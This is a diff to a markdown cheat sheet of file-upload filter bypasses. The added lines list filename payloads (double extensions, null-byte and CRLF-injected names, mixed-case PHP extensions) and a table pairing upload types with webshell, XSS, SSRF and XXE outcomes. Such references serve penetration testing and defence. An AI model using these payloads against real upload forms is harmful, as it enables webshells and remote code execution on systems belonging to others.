@@ -35,19 +35,31 @@ file.asa
 file.cert
 ```
 
-##### Capital Letters of Extensions
+##### Lower & Uppercase of Extensions
 ```
 file.PhP
 file.AspX
 ```
 
-#### Using Special Trailing Such as Spaces, Dots or Null Characters
+#### Using Special Trailing Such as Spaces, Dots or Null Characters or Double Extensions or Adding Junk Data
 ```
 file.asp...
 file.php;jpg
+file.png.php
+file.png.Php5
+file.png.pHp5
 file.php%00.png
 file.php\x00.png
 file.jpg%00.php
+file.php%0d%0a
+file.php/
+file.php.\
+file.php%20
+file.php%0a
+file.php%00
+file.
+file.php%0delete0.jpg
+file.phpJunk123png
 ```
 
 #### In IIS6 vulnerability, if the file name is ```file.asp;file.jpg```, the file will be executed as ```file.asp```.
@@ -91,8 +103,7 @@ Change 'type=file' to 'type=url'
 #### DoS Attack via Long File Name
 ```
 # This one is a sample
-# File name can be larger than this
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbb.jpeg
+aaaaaaaaa...zzzzzz.jpeg
 ```
 
 #### DoS Attack via Pixel Flood Attack
@@ -118,3 +129,15 @@ For pixel change: https://www.resizepixel.com/
 ```
 #### Uploaded file not found? Try Path Traversal on filename.
 #### Try to brutefore file extension
+
+### List of things that you can achieve by uploading file
+* SVG: Stored XSS / SSRF / XXE
+* HTML / JS : HTML injection / XSS / Open redirect
+* ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
+* GIF: Stored XSS / SSRF
+* CSV: CSV injection
+* PNG / JPEG: Pixel flood attack (DoS)
+* ZIP: RCE via LFI / DoS
+* PDF / PPTX: SSRF / BLIND XXE
+* XML: XXE
+* AVI: LFI / SSRF
